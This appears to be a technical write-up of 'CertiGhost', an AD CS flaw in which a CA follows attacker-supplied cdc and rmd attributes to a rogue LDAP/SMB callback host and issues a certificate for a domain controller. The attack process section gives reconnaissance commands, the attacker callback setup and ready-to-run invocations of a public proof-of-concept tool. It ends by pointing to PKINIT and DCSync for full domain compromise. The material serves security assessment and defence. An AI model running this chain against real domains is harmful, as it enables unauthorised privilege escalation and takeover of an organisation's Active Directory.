**CertiGhost** abuses an **AD CS enrollment chase/callback path**. The CA can use requester-controlled `cdc` and `rmd` attributes when resolving the identity that should be included in the certificate.

```text
cdc = attacker-controlled callback IP
rmd = target DC DNS name
```

If the CA follows the chase, it connects to the attacker over **LDAP/389** and **SMB/LSA/445**. The attacker authenticates using a controlled machine account, while the rogue services return the target DC's `sAMAccountName`, `objectSid` and `dNSHostName`.

The vulnerable CA does not correctly bind the returned identity to the authenticated callback principal, allowing a certificate for the target DC to be issued.


---

## Attack Process

First check whether the domain allows normal users to create computer accounts. This is commonly provided by `ms-DS-MachineAccountQuota`:

```powershell
Get-ADDomain | Select-Object DNSRoot, ms-DS-MachineAccountQuota
```

If the value is greater than `0`, a low-privileged domain account may be able to create a controlled machine account, which is one of the prerequisites for the attack.

Next identify the Enterprise CA:

```cmd
certutil -config - -ping
```

On the CA itself, check whether the vulnerable chase functionality is enabled:

```cmd
certutil -getreg policy\EditFlags
```

Look for:

```text
EDITF_ENABLECHASECLIENTDC
```

The CA also needs to be able to reach the attacker's callback host. From the CA, test the two relevant ports:

```powershell
Test-NetConnection <CALLBACK_IP> -Port 389
Test-NetConnection <CALLBACK_IP> -Port 445
```

From the attacker, monitor the connections:

```bash
sudo tcpdump -ni any 'host <CA_IP> and (port 389 or port 445)'
```

During exploitation, the important part of the request is the combination of:

```text
cdc = <ATTACKER_IP>
rmd = <TARGET_DC_DNS>
```

The resulting flow is:

```text
Low-privileged user
        |
        | certificate request
        v
       CA
        |
        | cdc = attacker
        v
Rogue LDAP / LSA
        |
        | authenticate as ATTACKER-PC$
        |
        | return:
        |   sAMAccountName = DC01$
        |   objectSid      = DC01 SID
        |   dNSHostName    = dc01.domain.local
        v
       CA
        |
        v
DC certificate
```

The public [PoC](https://github.com/aniqfakhrul/CVE-2026-54121) automates this process. Its basic invocation is:

```bash
sudo python3 certighost.py \
    -d playground.local \
    -u lowpriv \
    -p 'Password1234' \
    --dc-ip 192.168.1.10
```

If an existing controlled computer account should be reused:

```bash
sudo python3 certighost.py \
    -d playground.local \
    -u lowpriv \
    -p 'Password1234' \
    --dc-ip 192.168.1.10 \
    --computer-name 'ATTACKER-PC$'
```

`--listener` can be used when the callback IP needs to be explicitly selected:

```bash
sudo python3 certighost.py \
    -d playground.local \
    -u lowpriv \
    -p 'Password1234' \
    --dc-ip 192.168.1.10 \
    --listener 192.168.1.50
```

The PoC requires root because it listens on privileged ports `389` and `445`.

If the vulnerable path succeeds, the CA issues a certificate representing the target DC. The published attack chain can then use that certificate for **PKINIT**, producing Kerberos credentials and potentially continuing to DCSync/domain compromise.

For a production assessment, only perform the PKINIT/DCSync stage when it is explicitly authorized.
